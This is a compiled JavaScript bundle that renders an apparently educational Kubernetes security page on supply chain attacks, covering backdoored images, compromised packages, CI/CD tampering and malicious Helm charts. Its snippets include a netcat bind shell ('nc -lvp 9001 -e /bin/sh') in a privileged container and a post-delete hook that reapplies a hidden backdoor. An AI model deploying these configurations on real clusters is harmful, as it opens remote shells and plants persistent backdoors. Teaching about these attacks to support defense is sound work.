"use strict";(self.webpackChunkk_8_s_security=self.webpackChunkk_8_s_security||[]).push([[6647],{8453:(e,i,n)=>{n.d(i,{R:()=>l,x:()=>c});var s=n(6540);const a={},t=s.createContext(a);function l(e){const i=s.useContext(t);return s.useMemo((function(){return"function"==typeof e?e(i):{...i,...e}}),[i,e])}function c(e){let i;return i=e.disableParentContext?"function"==typeof e.components?e.components(a):e.components||a:l(e.components),s.createElement(t.Provider,{value:i},e.children)}},9578:(e,i,n)=>{n.r(i),n.d(i,{assets:()=>r,contentTitle:()=>c,default:()=>d,frontMatter:()=>l,metadata:()=>s,toc:()=>o});const s=JSON.parse('{"id":"attack_vectors/supply_chain_attacks","title":"Supply Chain Attacks","description":"How attackers compromise container images, dependencies, CI/CD pipelines, and Helm charts to infiltrate Kubernetes clusters.","source":"@site/docs/attack_vectors/supply_chain_attacks.md","sourceDirName":"attack_vectors","slug":"/attack_vectors/supply_chain_attacks","permalink":"/k8s_security/docs/attack_vectors/supply_chain_attacks","draft":false,"unlisted":false,"editUrl":"https://github.com/geek-kb/k8s_security/edit/main/docs/attack_vectors/supply_chain_attacks.md","tags":[],"version":"current","lastUpdatedBy":"Itai Ganot","lastUpdatedAt":1742801266000,"sidebarPosition":6,"frontMatter":{"sidebar_position":6,"title":"Supply Chain Attacks","description":"How attackers compromise container images, dependencies, CI/CD pipelines, and Helm charts to infiltrate Kubernetes clusters."},"sidebar":"default","previous":{"title":"Lack of Network Policies","permalink":"/k8s_security/docs/attack_vectors/lack_of_network_policies"},"next":{"title":"Unrestricted etcd Access","permalink":"/k8s_security/docs/attack_vectors/unrestricted_etcd_access"}}');var a=n(4848),t=n(8453);const l={sidebar_position:6,title:"Supply Chain Attacks",description:"How attackers compromise container images, dependencies, CI/CD pipelines, and Helm charts to infiltrate Kubernetes clusters."},c="Supply Chain Attacks",r={},o=[{value:"Exploitation Steps: Poisoning the Software Supply Chain",id:"exploitation-steps-poisoning-the-software-supply-chain",level:2},{value:"1. Publish a Malicious Container Image",id:"1-publish-a-malicious-container-image",level:3},{value:"2. Deploy Unverified Image in Production",id:"2-deploy-unverified-image-in-production",level:3},{value:"3. Inject Malicious Dependencies",id:"3-inject-malicious-dependencies",level:3},{value:"4. Tamper with the CI/CD Pipeline",id:"4-tamper-with-the-cicd-pipeline",level:3},{value:"Exploitation Steps: Deploying a Malicious Helm Chart",id:"exploitation-steps-deploying-a-malicious-helm-chart",level:2},{value:"1. Publish a Malicious Helm Chart",id:"1-publish-a-malicious-helm-chart",level:3},{value:"2. Install Chart Without Verification",id:"2-install-chart-without-verification",level:3},{value:"3. Bypass Pod Security Policies",id:"3-bypass-pod-security-policies",level:3},{value:"4. Maintain Persistence After Uninstall",id:"4-maintain-persistence-after-uninstall",level:3},{value:"Result",id:"result",level:3},{value:"Mitigation",id:"mitigation",level:2}];function p(e){const i={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",header:"header",hr:"hr",li:"li",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,t.R)(),...e.components};return(0,a.jsxs)(a.Fragment,{children:[(0,a.jsx)(i.header,{children:(0,a.jsx)(i.h1,{id:"supply-chain-attacks",children:"Supply Chain Attacks"})}),"\n",(0,a.jsxs)(i.p,{children:["Supply chain attacks in Kubernetes target the ",(0,a.jsx)(i.strong,{children:"container build process, dependencies, CI/CD pipelines, or Helm charts"})," to introduce malicious components into your cluster. These attacks can lead to ",(0,a.jsx)(i.strong,{children:"unauthorized access, persistent backdoors, and data exfiltration"}),"."]}),"\n",(0,a.jsx)(i.hr,{}),"\n",(0,a.jsx)(i.h2,{id:"exploitation-steps-poisoning-the-software-supply-chain",children:"Exploitation Steps: Poisoning the Software Supply Chain"}),"\n",(0,a.jsx)(i.p,{children:"An attacker compromises the cluster by introducing malicious components during the software delivery lifecycle."}),"\n",(0,a.jsx)(i.h3,{id:"1-publish-a-malicious-container-image",children:"1. Publish a Malicious Container Image"}),"\n",(0,a.jsx)(i.p,{children:"The attacker creates and pushes a backdoored image to a public registry:"}),"\n",(0,a.jsx)(i.pre,{children:(0,a.jsx)(i.code,{className:"language-bash",children:"docker build -t attacker/malicious-app .\ndocker push docker.io/attacker/malicious-app\n"})}),"\n",(0,a.jsx)(i.hr,{}),"\n",(0,a.jsx)(i.h3,{id:"2-deploy-unverified-image-in-production",children:"2. Deploy Unverified Image in Production"}),"\n",(0,a.jsx)(i.p,{children:"A Kubernetes workload unknowingly uses the attacker\u2019s image:"}),"\n",(0,a.jsx)(i.pre,{children:(0,a.jsx)(i.code,{className:"language-yaml",children:"apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vulnerable-app\nspec:\n  template:\n    spec:\n      containers:\n        - name: app\n          image: docker.io/attacker/malicious-app\n"})}),"\n",(0,a.jsx)(i.p,{children:"No signature validation or source verification is performed."}),"\n",(0,a.jsx)(i.hr,{}),"\n",(0,a.jsx)(i.h3,{id:"3-inject-malicious-dependencies",children:"3. Inject Malicious Dependencies"}),"\n",(0,a.jsx)(i.p,{children:"The attacker publishes a compromised package:"}),"\n",(0,a.jsx)(i.pre,{children:(0,a.jsx)(i.code,{className:"language-bash",children:"npm publish compromised-library\n"})}),"\n",(0,a.jsxs)(i.p,{children:["It is pulled automatically by an unsuspecting developer into a container image, enabling ",(0,a.jsx)(i.strong,{children:"remote code execution"})," in production."]}),"\n",(0,a.jsx)(i.hr,{}),"\n",(0,a.jsx)(i.h3,{id:"4-tamper-with-the-cicd-pipeline",children:"4. Tamper with the CI/CD Pipeline"}),"\n",(0,a.jsx)(i.p,{children:"The attacker steals CI secrets and modifies manifests:"}),"\n",(0,a.jsx)(i.pre,{children:(0,a.jsx)(i.code,{className:"language-bash",children:"kubectl apply -f attacker-modified-deployment.yaml\n"})}),"\n",(0,a.jsx)(i.p,{children:"This injects malicious logic into deployments automatically."}),"\n",(0,a.jsx)(i.hr,{}),"\n",(0,a.jsx)(i.h2,{id:"exploitation-steps-deploying-a-malicious-helm-chart",children:"Exploitation Steps: Deploying a Malicious Helm Chart"}),"\n",(0,a.jsx)(i.p,{children:"Helm charts offer another attack surface for supply chain compromise."}),"\n",(0,a.jsx)(i.h3,{id:"1-publish-a-malicious-helm-chart",children:"1. Publish a Malicious Helm Chart"}),"\n",(0,a.jsx)(i.p,{children:"The attacker embeds a backdoor in a Helm chart:"}),"\n",(0,a.jsx)(i.pre,{children:(0,a.jsx)(i.code,{className:"language-yaml",children:'containers:\n  - name: backdoor-container\n    image: attacker/malicious-image\n    securityContext:\n      privileged: true\n    command: ["/bin/sh", "-c"]\n    args: ["while true; do nc -lvp 9001 -e /bin/sh; done"]\n'})}),"\n",(0,a.jsx)(i.p,{children:"They then push it to a public repository:"}),"\n",(0,a.jsx)(i.pre,{children:(0,a.jsx)(i.code,{className:"language-bash",children:"helm package malicious-app\nhelm push malicious-app-1.0.0.tgz oci://public-helm-repo\n"})}),"\n",(0,a.jsx)(i.hr,{}),"\n",(0,a.jsx)(i.h3,{id:"2-install-chart-without-verification",children:"2. Install Chart Without Verification"}),"\n",(0,a.jsx)(i.p,{children:"A user installs the chart without checking provenance:"}),"\n",(0,a.jsx)(i.pre,{children:(0,a.jsx)(i.code,{className:"language-bash",children:"helm repo add untrusted-repo oci://public-helm-repo\nhelm install vulnerable-app untrusted-repo/malicious-app\n"})}),"\n",(0,a.jsxs)(i.p,{children:["The ",(0,a.jsx)(i.strong,{children:"malicious workload"})," is now running."]}),"\n",(0,a.jsx)(i.hr,{}),"\n",(0,a.jsx)(i.h3,{id:"3-bypass-pod-security-policies",children:"3. Bypass Pod Security Policies"}),"\n",(0,a.jsx)(i.p,{children:"The attacker escalates privileges through insecure templates:"}),"\n",(0,a.jsx)(i.pre,{children:(0,a.jsx)(i.code,{className:"language-yaml",children:"apiVersion: policy/v1beta1\nkind: PodSecurityPolicy\nmetadata:\n  name: privileged-psp\nspec:\n  privileged: true\n  runAsUser:\n    rule: RunAsAny\n  seLinux:\n    rule: RunAsAny\n"})}),"\n",(0,a.jsx)(i.p,{children:"They enable this at install:"}),"\n",(0,a.jsx)(i.pre,{children:(0,a.jsx)(i.code,{className:"language-bash",children:"helm install --set securityPolicy.privileged=true exploit-app\n"})}),"\n",(0,a.jsx)(i.hr,{}),"\n",(0,a.jsx)(i.h3,{id:"4-maintain-persistence-after-uninstall",children:"4. Maintain Persistence After Uninstall"}),"\n",(0,a.jsx)(i.p,{children:"A Helm hook ensures the backdoor remains:"}),"\n",(0,a.jsx)(i.pre,{children:(0,a.jsx)(i.code,{className:"language-yaml",children:'hooks:\n  post-delete:\n    - exec:\n        command:\n          [\n            "/bin/sh",\n            "-c",\n            "while true; do sleep 60; kubectl apply -f /tmp/hidden-backdoor.yaml; done",\n          ]\n'})}),"\n",(0,a.jsx)(i.p,{children:"Even if the user runs:"}),"\n",(0,a.jsx)(i.pre,{children:(0,a.jsx)(i.code,{className:"language-bash",children:"helm uninstall exploit-app\n"})}),"\n",(0,a.jsxs)(i.p,{children:["The malicious deployment ",(0,a.jsx)(i.strong,{children:"reinstalls itself"}),"."]}),"\n",(0,a.jsx)(i.hr,{}),"\n",(0,a.jsx)(i.h3,{id:"result",children:"Result"}),"\n",(0,a.jsx)(i.p,{children:"The attacker successfully compromises the Kubernetes cluster via supply chain vectors, enabling:"}),"\n",(0,a.jsxs)(i.ul,{children:["\n",(0,a.jsx)(i.li,{children:"Deployment of malicious containers and packages"}),"\n",(0,a.jsx)(i.li,{children:"Privilege escalation"}),"\n",(0,a.jsx)(i.li,{children:"Long-term persistence"}),"\n",(0,a.jsx)(i.li,{children:"CI/CD pipeline abuse"}),"\n"]}),"\n",(0,a.jsx)(i.hr,{}),"\n",(0,a.jsx)(i.h2,{id:"mitigation",children:"Mitigation"}),"\n",(0,a.jsxs)(i.p,{children:["\u27a1 ",(0,a.jsx)(i.a,{href:"/docs/best_practices/supply_chain_mitigation",children:"Securing the Kubernetes Supply Chain"})]})]})}function d(e={}){const{wrapper:i}={...(0,t.R)(),...e.components};return i?(0,a.jsx)(i,{...e,children:(0,a.jsx)(p,{...e})}):p(e)}}}]);